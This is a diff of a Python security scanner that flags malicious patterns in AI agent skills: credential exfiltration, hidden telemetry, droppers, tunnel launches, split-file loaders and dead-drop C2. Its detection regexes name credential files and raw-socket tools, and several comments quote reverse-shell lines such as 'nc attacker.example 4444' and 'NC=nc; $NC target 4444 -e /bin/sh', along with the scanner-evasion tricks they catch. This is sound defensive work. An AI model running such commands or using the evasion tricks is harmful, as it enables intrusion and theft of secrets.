         # not a taint check; see _subprocess_call_is_fixed_argv).
         list_bindings_by_call = _list_bindings_by_call(tree)
+        # B-422 follow-up: names bound to a networking-library session/client/socket
+        # constructor (e.g. `s = requests.Session()`), so _is_net_sink recognizes
+        # `s.put(...)` the same as a literal `session.put(...)` — see _net_sink_alias_names.
+        net_sink_aliases = _net_sink_alias_names(tree)
     except (SyntaxError, ValueError, RecursionError, MemoryError, OverflowError) as exc:
         err_type = type(exc).__name__
         return [
@@ -2452,18 +4295,30 @@ def analyze_python(
     if _CRED_PATH_RE.search(source):
         cred_tainted = _cred_tainted_names(tree)
         if cred_tainted:
+            # B-415: names sourced PURELY from the in-cluster K8s service-account
+            # token -- computed once per file, only when there's anything credential-
+            # tainted at all, since both helpers re-walk the whole tree.
+            incluster_pure = _incluster_pure_tainted_names(tree)
+            str_map = _simple_str_const_assigns(tree) if incluster_pure else {}
             for node in ast.walk(tree):
-                if (
-                    isinstance(node, ast.Call)
-                    and _is_net_sink(node.func)
-                    and (_names_in(node) & cred_tainted)
+                if not (isinstance(node, ast.Call) and _is_net_sink(node.func, net_sink_aliases)):
+                    continue
+                hit_names = _names_in(node) & cred_tainted
+                if not hit_names:
+                    continue
+                # Exemption applies ONLY when every hit name is in-cluster-pure (never
+                # a name also/ever sourced from .ssh/.aws/a generic secrets mount) AND
+                # the position+destination checks in _is_incluster_auth_exempt hold.
+                if hit_names <= incluster_pure and _is_incluster_auth_exempt(
+                    node, hit_names, str_map
                 ):
-                    add(
-                        "CRED_EXFIL_FLOW",
-                        "crit",
-                        getattr(node, "lineno", 0),
-                        "credential-file contents flow into a network sink (read secret -> send out)",
-                    )
+                    continue
+                add(
+                    "CRED_EXFIL_FLOW",
+                    "crit",
+                    getattr(node, "lineno", 0),
+                    "credential-file contents flow into a network sink (read secret -> send out)",
+                )
 
     # F-049: env-var / agent-config secret reaching a network sink (SkillSpector E2 env
     # harvesting + E1 external transmission).  Severity is "info" and the checks engine routes it
@@ -2477,7 +4332,7 @@ def analyze_python(
         for node in ast.walk(tree):
             if len(out) >= _MAX_FINDINGS_PER_FILE:
                 break
-            if not (isinstance(node, ast.Call) and _is_net_sink(node.func)):
+            if not (isinstance(node, ast.Call) and _is_net_sink(node.func, net_sink_aliases)):
                 continue
             # Only a BODY / URL / params position counts. A secret in headers=/auth= is the
             # normal way a skill authenticates to its own API (env key -> Authorization
@@ -2523,7 +4378,7 @@ def analyze_python(
             if not isinstance(node, ast.Call):
                 continue
             ln = getattr(node, "lineno", 0)
-            if _is_net_sink(node.func):
+            if _is_net_sink(node.func, net_sink_aliases):
                 arg_subtrees = [
                     *node.args,
                     *(kw.value for kw in node.keywords if kw.arg not in _ENV_AUTH_KWARGS),
@@ -2596,6 +4451,51 @@ def analyze_python(
                     )
                     break
 
+    # B-342 (T09/SkillTrustBench V_EXCESSIVE_TELEMETRY): EXCESSIVE_TELEMETRY_FLOW — a
+    # function combining >=2 over-collection axes (bulk env dump, recursive/bulk
+    # filesystem walk, bulk directory listing, shell/command-history file read) whose
+    # value reaches a network sink. See the constant block near _TELEMETRY_SIGNAL_RE
+    # (top of file) for the full rationale, including why the disclosure gate — not
+    # this AST shape alone — is what actually separates a hidden collector from a
+    # disclosed, legitimate telemetry/diagnostics/backup skill.
+    if _TELEMETRY_SIGNAL_RE.search(source):
+        collector_funcs = _telemetry_collector_funcnames(tree)
+        if collector_funcs:
+            telemetry_tainted = _telemetry_tainted_names(tree, collector_funcs)
+            for node in ast.walk(tree):
+                if len(out) >= _MAX_FINDINGS_PER_FILE:
+                    break
+                if not (isinstance(node, ast.Call) and _is_net_sink(node.func, net_sink_aliases)):
+                    continue
+                arg_subtrees = [
+                    *node.args,
+                    *(kw.value for kw in node.keywords if kw.arg not in _ENV_AUTH_KWARGS),
+                ]
+                hit = False
+                for arg in arg_subtrees:
+                    if telemetry_tainted and (_names_in(arg) & telemetry_tainted):
+                        hit = True
+                        break
+                    if any(
+                        isinstance(n, ast.Call)
+                        and isinstance(n.func, ast.Name)
+                        and n.func.id in collector_funcs
+                        for n in ast.walk(arg)
+                    ):
+                        hit = True
+                        break
+                if hit:
+                    add(
+                        "EXCESSIVE_TELEMETRY_FLOW",
+                        "info",
+                        getattr(node, "lineno", 0),
+                        "a function collects data across multiple over-collection axes "
+                        "(bulk env-var dump, recursive/bulk filesystem or directory "
+                        "enumeration, or a shell/command-history file read) and the "
+                        "assembled value flows into a network sink — verify this is "
+                        "disclosed telemetry, not a hidden collector",
+                    )
+
     # C-205: DROPPER_DOWNLOAD_TO_TMP — an argv-list curl/wget subprocess call staging a
     # script into a writable/tmp-like path, with no literal pipe for B100's regex to
     # match (the URL is typically a variable too). Checked independently of the loops
@@ -2628,6 +4528,38 @@ def analyze_python(
                 "curl|sh match)",
             )
 
+    # TUNNEL_LAUNCH_ARGV — an argv-list tunnel/mesh-VPN launch
+    # primitive (see the module comment above `_TUNNEL_ARGV_BARE_PROGRAMS`). info (not
+    # crit), matching DROPPER_DOWNLOAD_TO_TMP/CHUNKED_FILE_EXEC's grade — checks/_vet.py's
+    # check_installed_skills routes this rule through its own explicit continue-branch
+    # (mirrors CHUNKED_FILE_EXEC's guard), so it can never become FAIL-capable there
+    # regardless of this severity label; checks/_content.py's check_tunnel_enrollment
+    # (B338) is this rule's sole consumer and stays WARN-only by design.
+    for node in ast.walk(tree):
+        if len(out) >= _MAX_FINDINGS_PER_FILE:
+            break
+        if not _is_tunnel_launch_argv_call(node):
+            continue
+        prog_elts = _argv_str_elts(node.args[0])
+        argv_repr = ", ".join(repr(e) for e in prog_elts[:4])
+        add(
+            "TUNNEL_LAUNCH_ARGV",
+            "info",
+            getattr(node, "lineno", 0),
+            f"argv-list subprocess call launches a tunnel/mesh-VPN primitive: "
+            f"[{argv_repr}] — the idiomatic Python form a text-regex scan of the same "
+            "skill's source would miss",
+        )
+
+    # B336: CHUNKED_FILE_EXEC — a locally-defined helper reads and joins multiple
+    # chunked/part files at runtime, and the assembled result is exec()'d/eval()'d — the
+    # split-by-file scanner-evasion loader shape. info (not crit): a corroborated-but-new
+    # heuristic; checks/_vet.py's check_installed_skills routes this rule through its own
+    # explicit continue-branch, so it can never reach that function's generic crit/
+    # cred-exfil FAIL fallthrough regardless of this severity label.
+    for _cf_ln, _cf_reason in _chunked_file_exec_findings(tree):
+        add("CHUNKED_FILE_EXEC", "info", _cf_ln, _cf_reason)
+
     # B-284: remote-fetch -> exec/eval through ONE local-helper return hop, the form
     # TT5_CMD_INJECTION below does not reach. crit, like TT5: bytes downloaded at
     # runtime and executed are a remote code loader by construction.
@@ -2645,13 +4577,29 @@ def analyze_python(
             "then executed — staged remote code execution",
         )
 
+    # F-159: dead-drop C2 resolver — periodic poll -> decode -> exec (see the module
+    # comment above `_SLEEP_BASES`). confirmed dataflow is crit -> FAIL; the three
+    # ingredients merely co-located (no confirmed dataflow) is info -> WARN only.
+    # list_bindings_by_call (already computed above, B-132) is threaded through so a
+    # subprocess command bound to a local variable is still resolved to its fixed
+    # argv list for the command-vs-data-argument split (F-159 follow-up).
+    _dd_confirmed, _dd_ambiguous = _deaddrop_resolver_findings(tree, list_bindings_by_call)
+    for _dd_ln, _dd_reason in _dd_confirmed:
+        add("DEADDROP_RESOLVER", "crit", _dd_ln, _dd_reason)
+    for _dd_ln, _dd_reason in _dd_ambiguous:
+        add("DEADDROP_RESOLVER_AMBIGUOUS", "info", _dd_ln, _dd_reason)
+
     # Extended taint rules: TT5 (external-input -> exec), TT4 (file-read -> network),
     # SSRF (tainted URL -> network-fetch).  Compute external taint once and reuse.
-    func_params = _collect_func_params(tree)
-    ext_tainted = _external_tainted_names(tree, func_params)
-    bindings_by_call = _list_bindings_by_call(tree)
+    # B-413 layer 1: scope-bucketed, reusing the SAME owner_map/parent_scope/
+    # shadow_cache/list_bindings_by_call already built above for the decode->exec
+    # taint rule (never recomputed).
+    func_param_taint = _func_param_taint_by_scope(tree, owner_map, parent_scope)
+    ext_taint_map = _external_tainted_names(
+        tree, func_param_taint, owner_map, parent_scope, shadow_cache
+    )
 
-    if ext_tainted:
+    if ext_taint_map:
         for node in ast.walk(tree):
             if len(out) >= _MAX_FINDINGS_PER_FILE:
                 break
@@ -2662,14 +4610,29 @@ def analyze_python(
             # TT5: tainted value flows into exec/eval/os.system/os.popen/subprocess.*
             is_exec, exec_name = _is_exec_sink_call(node.func)
             if is_exec:
-                any_t, direct = _call_args_tainted(node, ext_tainted)
+                ext_visible = _tainted_names_visible(
+                    node, ext_taint_map, owner_map, parent_scope, shadow_cache
+                )
+                any_t, direct = _call_args_tainted(node, ext_visible)
                 if any_t:
                     # A subprocess argv-list call (shell=False, fixed program) is only
                     # argument injection, not command injection — do not escalate to crit.
+                    # B-413 layer 2: also downgraded when EVERY intra-file call site to
+                    # a wrapper function binds this tainted parameter to a hardcoded,
+                    # untainted-program argv list — see
+                    # _subprocess_taint_is_command_injection's own docstring.
                     if exec_name.startswith(
                         "subprocess."
                     ) and not _subprocess_taint_is_command_injection(
-                        node, ext_tainted, bindings_by_call.get(node)
+                        node,
+                        ext_visible,
+                        list_bindings_by_call.get(node),
+                        tree=tree,
+                        owner_map=owner_map,
+                        parent_scope=parent_scope,
+                        shadow_cache=shadow_cache,
+                        ext_taint_map=ext_taint_map,
+                        list_bindings_by_call=list_bindings_by_call,
                     ):
                         add(
                             "TT5_ARG_INJECTION",
@@ -2707,7 +4670,10 @@ def analyze_python(
             # SSRF: externally-tainted value flows into a network-fetch URL argument.
             is_ssrf_s, ssrf_name = _is_ssrf_sink_call(node.func)
             if is_ssrf_s:
-                any_t, direct = _call_args_tainted(node, ext_tainted)
+                ext_visible = _tainted_names_visible(
+                    node, ext_taint_map, owner_map, parent_scope, shadow_cache
+                )
+                any_t, direct = _call_args_tainted(node, ext_visible)
                 if any_t:
                     # Elevate evidence when a literal internal endpoint appears in the file.
                     has_internal = bool(_SSRF_LITERAL_RE.search(source))
@@ -2795,12 +4761,13 @@ def analyze_env_auth_kwarg_exfil(source: str, filename: str = "<skill>") -> list
         return []
 
     env_src_tainted = _env_tainted_names(tree) | _agent_config_file_tainted_names(source, tree)
+    net_sink_aliases = _net_sink_alias_names(tree)
     out: list[ASTFinding] = []
     seen: set[int] = set()
     for node in ast.walk(tree):
         if len(out) >= _MAX_FINDINGS_PER_FILE:
             break
-        if not (isinstance(node, ast.Call) and _is_net_sink(node.func)):
+        if not (isinstance(node, ast.Call) and _is_net_sink(node.func, net_sink_aliases)):
             continue
         auth_kwarg_subtrees = [kw.value for kw in node.keywords if kw.arg in _ENV_AUTH_KWARGS]
         hit = False
@@ -2819,17 +4786,21 @@ def analyze_env_auth_kwarg_exfil(source: str, filename: str = "<skill>") -> list
         if lineno in seen:
             continue
         seen.add(lineno)
-        out.append(
-            ASTFinding(
-                "ENV_AUTH_KWARG_EXFIL",
-                "info",
-                lineno,
-                "an environment-variable or agent-config secret is placed in an "
-                "auth-shaped keyword (headers/auth/cert) of a network call — the normal "
-                "way a skill authenticates to its own API, but never independently "
-                "reviewed; verify the destination is trusted",
-            )
+        # C-340: surface the destination host when the URL is a plain string literal
+        # (the same resolver B-190's sibling walk already uses, line ~3115) so the
+        # host-agent judge adjudicating this UNKNOWN has something concrete to check —
+        # "verify the destination is trusted" with no destination was nothing to verify.
+        # A variable/f-string URL can't be resolved statically; the message stays
+        # generic rather than guessing (never fabricate a host).
+        dest_host = _url_literal_host(node.args[0]) if node.args else None
+        detail = (
+            "an environment-variable or agent-config secret is placed in an "
+            "auth-shaped keyword (headers/auth/cert) of a network call — the normal "
+            "way a skill authenticates to its own API, but never independently "
+            "reviewed; verify the destination is trusted"
+            + (f" (destination: {dest_host})" if dest_host else "")
         )
+        out.append(ASTFinding("ENV_AUTH_KWARG_EXFIL", "info", lineno, detail))
     return out
 
 
@@ -3614,11 +5585,48 @@ def analyze_python_package(files) -> list[ASTFinding]:
 _SH_CRED_FILE_RE = re.compile(
     r"\.ssh/id_[a-z0-9_]+|\bid_rsa\b|\bid_ed25519\b|\.aws/credentials|\.netrc\b|"
     r"login\.keychain|wallet\.dat|\.docker/config\b|\.kube/config\b|\.npmrc\b|\.pypirc\b|"
-    r"\.openclaw/|/\.config/[^/\s\"']+/",
+    r"\.openclaw/|/\.config/[^/\s\"']+/|"
+    # E-065/C-323: same widening as the Python _CRED_PATH_RE above -- a process's own
+    # environment (procfs), the K8s service-account bearer token mount, and the
+    # Docker/Swarm secrets mount are all real credential-bearing paths the HF-incident
+    # reproduction actually read. Unlike the Python regex, this one has no generic
+    # /\.?secrets?\b catch-all, so both mounts need an explicit entry.
+    r"/proc/(?:self|\d+)/environ|"
+    r"/var/run/secrets/kubernetes\.io/serviceaccount/token|"
+    r"/run/secrets/[^/\s\"']+",
     re.I,
 )
 # Outbound commands that can send data off the machine.
-_SH_OUTBOUND_RE = re.compile(r"\b(?:curl|wget|nc|ncat|netcat)\b|/dev/tcp/", re.I)
+# B-341 (SkillTrustBench fp_attribution, B13 39%-of-FPs bucket): the bare `nc` alternative
+# used to live directly in this regex as `(?<![{-])\bnc\b(?!\s*=)`, excluding only two
+# single characters immediately before the word: `{` (`${NC}`, bash's near-universal "No
+# Color" ANSI-reset variable) and `-` (a combined short-flag cluster on an unrelated
+# command, e.g. `jq -nc`). Round-1 also excluded a bare `$NC`, but independent C-135
+# review (round 2) found that unsound — `NC=nc; $NC target 4444 -e /bin/sh` is a real,
+# ordinary alias-bypass evasion the `$`-exclusion made invisible — so only `{` stayed
+# excluded, leaving bare `$NC` deliberately matching (residual, see B-430 below).
+#
+# B-430: a lookbehind can only ever exclude a FIXED, finite set of preceding characters,
+# and four C-135 rounds on this line (each scoped to `${NC}`/`-nc` only) never noticed
+# that `.`, `/`, `(`, `[`, `;`, `#` are ALL equally valid `\b` left-boundaries a bare
+# `nc` can sit after. The highest-value miss: the `.nc` FILE EXTENSION — NetCDF
+# (climate/ocean/atmospheric science's standard data format) and CNC G-code both use it
+# universally, and any path ending `.nc` sits right after a `.`, which `(?<![{-])` never
+# excluded. That hard-FAILed a skill reading `sst_2026-07-31.nc` next to an unrelated API
+# key as "ClawHavoc class ... uninstall NOW and rotate your secrets".
+#
+# Rather than add a 5th excluded character (whack-a-mole this project's own C-135
+# doctrine warns against), the bare-`nc`/`ncat`/`netcat` alternative is REMOVED from this
+# compiled regex entirely for the ambiguous bare-`nc` case and reimplemented as
+# `_sh_bare_nc_invocation()` below: a whitespace/metacharacter TOKEN classifier requiring
+# `nc` to be its own isolated shell word (not a substring of `sst_2026-07-31.nc`,
+# `/nc/index.php`, `${nodes[nc]}`, or `nc=$((nc+1))` — none of those are ever a
+# standalone token) AND in command position AND followed by an argument-shaped token.
+# `ncat`/`netcat` stay here unchanged (no reported collision — nothing ends a path in
+# `.ncat`), as does `/dev/tcp/` (an unambiguous literal, no word-boundary ambiguity at
+# all). See `_sh_bare_nc_invocation`'s docstring for the full mechanism, the `$NC`
+# residual carry-over, and what this round's C-135 tried and retracted.
+_SH_OUTBOUND_RE = re.compile(r"\b(?:curl|wget|ncat|netcat)\b|/dev/tcp/", re.I)
 # curl|wget URL piped into a NON-shell interpreter (download -> exec) — extends the
 # sh/bash-only _PIPE_SHELL_RE (the checks engine) to python/node/perl/ruby/php/deno.
 _SH_PIPE_INTERP_RE = re.compile(
@@ -3638,6 +5646,151 @@ _SH_CRED_ASSIGN_RE = re.compile(
     r"\.docker/config|\.kube/config|\.npmrc|\.pypirc|\.openclaw/)",
     re.I,
 )
+
+# B-415: shell-side counterparts of the Python in-cluster-auth exemption above
+# (_INCLUSTER_TOKEN_PATH_RE / _INCLUSTER_API_HOST_RE are shared, module-level --
+# same narrow token path, same narrow destination signal, defined once near
+# _CRED_PATH_RE). Two DISTINCT legitimate shapes cause a false SHELL_CRED_EXFIL:
+#
+#   1. curl's own TLS-material flags (--cacert/--capath/--cert/--key/-E) name a
+#      certificate/key file curl reads LOCALLY for the TLS handshake -- the raw
+#      bytes are never placed in the request URL/body/headers the way a
+#      credential VALUE would be (a CA cert only verifies the PEER; a client
+#      cert/key is used cryptographically to sign a challenge, never
+#      transmitted in the clear). This holds regardless of which file is named
+#      or which host is being called, so this exemption is deliberately
+#      POSITION-ONLY -- mirrors the Python side's _ENV_AUTH_KWARGS "cert" entry.
+#   2. The narrow in-cluster token specifically, referenced ONLY inside a
+#      -H/--header "Authorization: ..." value, on a line whose own destination
+#      resolves to the cluster's own API server -- mirrors the Python side's
+#      headers=/auth= position exemption. Unlike (1), this DOES need the
+#      narrow-source + destination checks: an Authorization header's VALUE is
+#      genuinely transmitted, so a generic credential (.ssh/.aws/etc.) or an
+#      attacker-controlled destination must never qualify.
+_SH_TLS_MATERIAL_FLAG_RE = re.compile(r"(?:--cacert|--capath|--cert|--key|-E)\s+")
+_SH_AUTH_HEADER_RE = re.compile(r"(?:-H|--header)\s+(['\"])\s*Authorization\s*:.*?\1", re.I)
+# ANY -H/--header value (not just Authorization) -- used to blank header text out
+# of the destination search below, not to detect a credential match.
+_SH_ANY_HEADER_VALUE_RE = re.compile(r"(?:-H|--header)\s+(['\"]).*?\1", re.I)
+_SH_VAR_ASSIGN_RE = re.compile(r"^[ \t]*(?P<var>[A-Za-z_][A-Za-z0-9_]{0,127})=(?P<val>.*)$")
+_SH_VAR_REF_RE = re.compile(r"\$\{?([A-Za-z_][A-Za-z0-9_]{0,127})\}?")
+
+
+def _sh_var_mentions_incluster_host(masked: str, name: str) -> bool:
+    """True if any top-level `name=...` assignment line in the WHOLE script
+    mentions the in-cluster API server signal -- a text-substrate search (never
+    a full value resolution), same limitation the Python side's simple
+    `_simple_str_const_assigns` map has."""
+    for m in _SH_VAR_ASSIGN_RE.finditer(masked):
+        if m.group("var") == name and _INCLUSTER_API_HOST_RE.search(m.group("val")):
+            return True
+    return False
+
+
+def _sh_line_destination_text(raw: str) -> str:
+    """*raw* with every -H/--header flag's own quoted value, and every
+    TLS-material flag's own path argument, blanked out (character positions
+    preserved so this stays a drop-in substitute for *raw* in a search). C-135:
+    a decoy destination string planted inside ANY header -- not just
+    Authorization -- must never be able to confirm the destination; only text
+    that can plausibly BE the outbound URL/body/positional arguments may."""
+    spans = [m.span() for m in _SH_ANY_HEADER_VALUE_RE.finditer(raw)]
+    for m in _SH_TLS_MATERIAL_FLAG_RE.finditer(raw):
+        arg_end = m.end()
+        while arg_end < len(raw) and not raw[arg_end].isspace():
+            arg_end += 1
+        spans.append((m.start(), arg_end))
+    if not spans:
+        return raw
+    chars = list(raw)
+    for start, end in spans:
+        for i in range(start, min(end, len(chars))):
+            chars[i] = " "
+    return "".join(chars)
+
+
+def _sh_candidate_destination_tokens(text: str) -> list:
+    """Whitespace-split tokens from *text* that could plausibly BE curl's own
+    outbound destination argument: a quoted/bare http(s) URL, or a variable
+    reference (`$VAR`/`${VAR}`, optionally with a literal path suffix like
+    `${API_SERVER}/api/...`). C-135: a flag (`-X`, `--foo`) or a bare word/
+    trailing-comment fragment with no scheme and no variable reference is NEVER
+    a candidate -- that closed a real gap where a decoy word like a bare
+    `kubernetes.default.svc` floating anywhere on the line (not an actual URL
+    argument at all), or the same text after an inline `#` comment, could
+    confirm a destination curl never actually requests."""
+    tokens = []
+    for tok in text.split():
+        t = tok.strip("'\"")
+        if not t or t.startswith("-"):
+            continue
+        if t.lower().startswith(("http://", "https://")) or t.startswith("$"):
+            tokens.append(t)
+    return tokens
+
+
+def _sh_line_has_incluster_destination(raw: str, masked: str) -> bool:
+    """True if a candidate destination TOKEN (see `_sh_candidate_destination_tokens`)
+    in the non-header, non-TLS-flag part of *raw* -- or a variable it references
+    (resolved against the whole script's simple `VAR=...` assignments) -- mentions
+    the cluster's own API server. Fails closed: an unresolvable variable, an
+    opaque expression, or text that isn't even URL/variable-shaped is simply not
+    a match, so the finding stays crit."""
+    dest_text = _sh_line_destination_text(raw)
+    for tok in _sh_candidate_destination_tokens(dest_text):
+        if _INCLUSTER_API_HOST_RE.search(tok):
+            return True
+        for name in _SH_VAR_REF_RE.findall(tok):
+            if _sh_var_mentions_incluster_host(masked, name):
+                return True
+    return False
+
+
+def _sh_cred_match_is_incluster_auth_only(raw: str, masked: str) -> bool:
+    """B-415/C-135: True only when EVERY `_SH_CRED_FILE_RE` match on *raw* is
+    either (a) inside curl's own TLS-material flag argument (--cacert/--capath/
+    --cert/--key/-E -- read locally for the handshake, never sent as request
+    data), or (b) the narrow in-cluster service-account token specifically,
+    referenced ONLY inside a -H/--header 'Authorization: ...' value, on a line
+    whose own destination resolves to the cluster's own API server. A
+    credential-path match ANYWHERE ELSE -- the URL, -d/--data body, a
+    non-Authorization header, or a bare unflagged argument -- makes this return
+    False, so the exemption can never launder a real exfil position. A generic
+    secrets-mount or dotfile credential (not the exact service-account token
+    path) never qualifies for (b), at any position or destination -- only the
+    TLS-flag case (a) can ever apply to it."""
+    matches = list(_SH_CRED_FILE_RE.finditer(raw))
+    if not matches:
+        return False
+    auth_header_spans = [m.span() for m in _SH_AUTH_HEADER_RE.finditer(raw)]
+    destination_ok: bool | None = None
+    for m in matches:
+        prefix = raw[: m.start()]
+        flag_matches = list(_SH_TLS_MATERIAL_FLAG_RE.finditer(prefix))
+        is_tls_flag_arg = False
+        if flag_matches:
+            between = prefix[flag_matches[-1].end() :]
+            # The match must still be the SAME shell word the flag introduced --
+            # no whitespace/segment-separator between the flag and the match
+            # (the credential-path regex can match a SUFFIX of the path token,
+            # e.g. the .../ca.crt case below, not always its very first char).
+            if not re.search(r"[\s;&|]", between):
+                is_tls_flag_arg = True
+        if is_tls_flag_arg:
+            continue
+        is_incluster_token = bool(_INCLUSTER_TOKEN_PATH_RE.search(m.group(0)))
+        in_auth_header = any(
+            start <= m.start() and m.end() <= end for start, end in auth_header_spans
+        )
+        if is_incluster_token and in_auth_header:
+            if destination_ok is None:
+                destination_ok = _sh_line_has_incluster_destination(raw, masked)
+            if destination_ok:
+                continue
+        return False
+    return True
+
+
 # decode-then-exec: an encoded blob is decoded (base64/xxd/openssl) and piped straight
 # into a shell/interpreter — the classic obfuscated-RCE dropper. Encode (no -d) and
 # decode-to-file (no `| interp`) stay silent.
@@ -3656,7 +5809,9 @@ _SH_EVAL_REMOTE_RE = re.compile(
 )
 # raw-socket outbound (nc//dev/tcp) — deliberately EXCLUDES curl/wget, which legitimately
 # carry an auth header to an API. Sending a secret over a raw socket is not legitimate.
-_SH_RAW_SOCKET_RE = re.compile(r"\b(?:nc|ncat|netcat)\b|/dev/tcp/", re.I)
+# B-341/B-430: same bare-`nc` history as _SH_OUTBOUND_RE above — see its comment. The
+# bare-`nc` alternative lives in `_sh_bare_nc_invocation()` now, not in this regex.
+_SH_RAW_SOCKET_RE = re.compile(r"\b(?:ncat|netcat)\b|/dev/tcp/", re.I)
 # a credential-shaped env-var NAME (contains TOKEN/SECRET/API_KEY/…). Gating env->outbound
 # on the name (not any $VAR) is what keeps this zero-FP against authed-API scripts.
 _SH_CRED_ENV_RE = re.compile(
@@ -3665,6 +5820,208 @@ _SH_CRED_ENV_RE = re.compile(
     r"[A-Za-z0-9_]*\}?",
     re.I,
 )
+
+# B-430: metacharacters that can glue directly onto a word with no surrounding
+# whitespace (`foo;nc`, `(nc`, `` `nc ``) get spaced out before whitespace-splitting, so
+# an `nc` glued to a separator is still recognized as its own token. `)` is deliberately
+# EXCLUDED from this list — see `_sh_bare_nc_invocation`'s case-label note below.
+_SH_NC_METACHAR_RE = re.compile(r"([;&|(`])")
+# A trailing token after `nc` that looks like a bare port number, tolerating whatever
+# punctuation (`)`, `;`, a trailing quote/backtick) sits glued on the end with no space.
+_SH_NC_PORT_RE = re.compile(r"^\d{1,5}[)\];,`\"']*$")
+# A single combined `host:port` argument, same trailing-punctuation tolerance.
+_SH_NC_HOSTPORT_RE = re.compile(r"^[\w.-]+:\d{1,5}[)\];,`\"']*$")
+# Tokens that unambiguously start a new command segment — `nc` immediately after one of
+# these is always in command position. `-exec` (find's own syntax: the word right after
+# it is always the command name) rides along here rather than in the no-op prefix set
+# below, since — unlike `sudo`/`env`/etc. — arbitrary `find` flags can sit between `find`
+# and `-exec`, so `-exec` itself (not whatever precedes it) is the anchor.
+_SH_NC_SEGMENT_START = frozenset(
+    {";", "|", "&", "(", "`", "then", "do", "else", "elif", "!", "-exec"}
+)
+# No-op wrapper words: skipping backward over any of these (plus flag-shaped tokens and
+# `VAR=val` prefix assignments, handled in `_sh_nc_command_position`) still counts as
+# command position — covers `sudo nc …`, `command nc …`, `env FOO=bar nc …`,
+# `eval "nc …"`, `xargs -n1 nc …`.
+_SH_NC_NOOP_PREFIX = frozenset(
+    {
+        "sudo",
+        "exec",
+        "command",
+        "nohup",
+        "time",
+        "nice",
+        "ionice",
+        "stdbuf",
+        "setsid",
+        "eval",
+        "env",
+        "xargs",
+    }
+)
+_SH_NC_VAR_ASSIGN_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=\S*$")
+
+
+def _sh_nc_word(tok: str) -> str:
+    """Normalize one whitespace/metachar-delimited shell word for bare-`nc` identity
+    comparison. Strips surrounding quote characters, a single leading backslash (the
+    `\\nc` alias/function-shadow bypass — backslash-escaping a command name to skip a
+    shell alias or function of the same name is a real, documented evasion, not a corner
+    case), and a single leading bare `$` (the deliberately-preserved `$NC` alias-
+    invocation residual carried over from B-341 round 2 — `NC=nc; $NC host 4444` is a
+    real evasion with no sound way to distinguish it from a bare color-reset variable at
+    the token level, so it is intentionally still treated as `nc`, same as before).
+    Braced `${NC}` is NOT unwrapped by the `$`-strip (the leading `{` blocks it), so it
+    stays unambiguous parameter expansion and never compares equal to a bare `nc`."""
+    t = tok.strip("'\"")
+    if t.startswith("\\"):
+        t = t[1:]
+    if t.startswith("$") and not t.startswith("${"):
+        t = t[1:]
+    return t
+
+
+def _sh_nc_command_position(words: list, i: int) -> bool:
+    """True if `words[i]` sits where a shell COMMAND NAME can appear: at the start of the
+    line/segment, or reached by skipping backward only over no-op wrapper words
+    (`_SH_NC_NOOP_PREFIX`), `VAR=val` prefix assignments, and flag-shaped tokens (`-n1`,
+    `-u`, …) — covering `sudo nc …`, `env FOO=bar nc …`, `xargs -n1 nc …`, `eval "nc …"`,
+    and (via `_SH_NC_SEGMENT_START`) `find … -exec nc …`. Any other word in between (a
+    filename, `for`, `case`, a trailing-comment `#`, …) blocks it — this is what excludes
+    the `case … in` / `nc)` pattern label, the `for nc in …` loop variable, and an `nc`
+    mentioned inside a trailing inline comment (masking only blanks WHOLE-LINE comments;
+    see `_sh_mask_comments`)."""
+    j = i - 1
+    while j >= 0:
+        w = words[j]
+        low = w.lower()
+        if w in _SH_NC_SEGMENT_START or low in _SH_NC_SEGMENT_START:
+            return True
+        if low in _SH_NC_NOOP_PREFIX:
+            j -= 1
+            continue
+        if w.startswith("-") and len(w) > 1:
+            j -= 1
+            continue
+        if _SH_NC_VAR_ASSIGN_RE.match(w):
+            j -= 1
+            continue
+        return False
+    return True
+
+
+def _sh_nc_arg_follows(words: list, i: int) -> bool:
+    """True if the word(s) after `words[i]` look like real `nc` arguments: a flag (`-e`,
+    `-lvp`, …) anywhere in the next few words (covers a port-before-flag ordering, e.g.
+    an `xargs`-appended arg landing before an explicit `-e`), a combined `host:port`, or
+    a bare host word followed by a numeric port word (`nc attacker.example 4444`) —
+    excluding a case-label's `)`, an arithmetic reference, or ordinary prose (a trailing
+    comment's next English word)."""
+    window = [w.strip("'\"") for w in words[i + 1 : i + 4]]
+    if not window:
+        return False
+    if any(w.startswith("-") and len(w) > 1 for w in window):
+        return True
+    nxt = window[0]
+    if _SH_NC_HOSTPORT_RE.match(nxt):
+        return True
+    if not nxt.startswith("-") and len(window) >= 2 and _SH_NC_PORT_RE.match(window[1]):
+        return True
+    return False
+
+
+def _sh_bare_nc_invocation(line: str) -> bool:
+    """B-430: whole-token, position-aware replacement for the bare-`nc` alternative that
+    used to live inside `_SH_OUTBOUND_RE`/`_SH_RAW_SOCKET_RE` as
+    `(?<![{-])\\bnc\\b(?!\\s*=)`.
+
+    Four prior C-135 rounds each patched that lookbehind for one collision at a time
+    (`${NC}`, then `-nc`/`jq -nc`), and none of them could have caught this ticket's gap:
+    a single-character lookbehind can exclude at most one preceding character, but `.`,
+    `/`, `(`, `[`, `;`, `#` are ALL valid `\\b` left-boundaries for a bare `nc` that a
+    lookbehind-only design can never enumerate completely (the highest-value miss is the
+    `.nc` file extension — NetCDF and CNC G-code both use it, and any path ending `.nc`
+    sits right after a `.`). Rather than add yet another excluded character, bare-`nc`
+    detection moves to an isolated shell WORD + command-position + argument-shape check:
+
+      1. `nc` must be its OWN whitespace/metachar-delimited token, not a substring of a
+         longer one. This alone kills the whole `.nc`/`/nc/`/`${nodes[nc]}`/
+         `nc=$((nc+1))` collision class — none of those is ever a standalone token.
+      2. It must sit in COMMAND POSITION (`_sh_nc_command_position`) — excludes the
+         `case … in` / `nc)` pattern label and the `for nc in …` loop variable, both real
+         standalone tokens that are never a command name.
+      3. It must be followed by an argument-shaped token (`_sh_nc_arg_follows`) — a
+         second, independent signal that excludes an `nc` mentioned in a trailing inline
+         comment (`curl ... # nc is not used here` still reaches this scan, since
+         `_sh_mask_comments` only blanks WHOLE-LINE comments); ordinary English prose
+         after `nc` is essentially never flag- or host:port-shaped.
+
+    The deliberately-preserved `$NC`-alias-invocation residual from B-341 round 2 carries
+    over unchanged (see `_sh_nc_word`): `NC=nc; $NC host 4444 -e /bin/sh` still matches,
+    braced `${NC}` still doesn't. Adding the command-position requirement actually makes
+    this residual NARROWER, not just relocated: a bare `echo "$NC"` (unbraced, but not in
+    command position either) no longer matches, where the old position-blind regex would
+    have.
+
+    C-135 (this round) considered also closing three narrower gaps inside this same
